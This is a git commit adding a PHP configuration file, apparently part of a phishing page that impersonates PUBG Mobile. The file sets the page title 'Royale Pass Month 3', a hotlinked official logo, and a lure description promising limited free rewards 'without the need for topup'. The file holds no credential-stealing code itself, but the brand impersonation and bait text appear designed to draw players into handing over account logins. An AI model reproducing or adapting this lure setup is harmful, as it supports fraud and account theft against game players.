dc86893ded9186d280766f87ddee9d991e9959dc
abasheyari595 <84859238+abasheyari595@users.noreply.github.com>
2021-10-03 18:14:03 +0200

    Add files via upload

--- system/setting.php
+++ system/setting.php
@@ -1,1 +1,16 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
 
+// KONTROL UNTUK MENDAPATKAN INFORMASI TAHUN SAAT INI (UNTUK DITAMPILKAN DIBAGIAN FOOTER HALAMAN)
+$yearNow = date('Y');
+
+// KONTROL UNTUK DESKRIPSI HALAMAN
+$title = 'PUBG MOBILE: Royale Pass Month 3';
+$description = 'Collect your special rewards at the Royale Pass Month 3 event. This opportunity is limited and without the need for topup. Collect your rewards now!';
+$copyright = 'PUBG MOBILE';
+$theme = '#000';
+$image = 'https://i.ibb.co/Yf2QsmQ/season.jpg';
+$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+?>
